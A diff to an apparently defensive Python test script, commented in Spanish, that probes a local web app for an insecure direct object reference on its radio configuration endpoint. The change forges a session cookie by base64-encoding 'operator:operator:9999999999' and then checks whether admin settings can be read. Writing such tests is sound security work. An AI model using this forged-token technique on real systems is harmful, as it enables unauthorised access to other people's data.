@@ -3,6 +3,8 @@
 Prueba Individual - Ataque 6: Referencia Insegura a Objetos Directos (IDOR)
 Prueba la lectura no autorizada de configuraciones de administración.
 """
+import base64
+
 import requests
 
 BASE_URL = "http://localhost:5000"
@@ -11,8 +13,10 @@ def test_attack_6():
     print("[+] Ejecutando Prueba Individual: Ataque 6 - IDOR en Configuración de Radio...")
     target_id = 1
     url = f"{BASE_URL}/api/config/radio/{target_id}"
+    token = base64.b64encode(b"operator:operator:9999999999").decode("utf-8")
+    cookies = {"session_token": token}
     try:
-        response = requests.get(url, timeout=5)
+        response = requests.get(url, cookies=cookies, timeout=5)
         print(f"[*] GET {url} - Status Code: {response.status_code}")
         if response.status_code == 200:
             print("[✓] Vulnerabilidad IDOR confirmada! Datos de configuración leídos:")
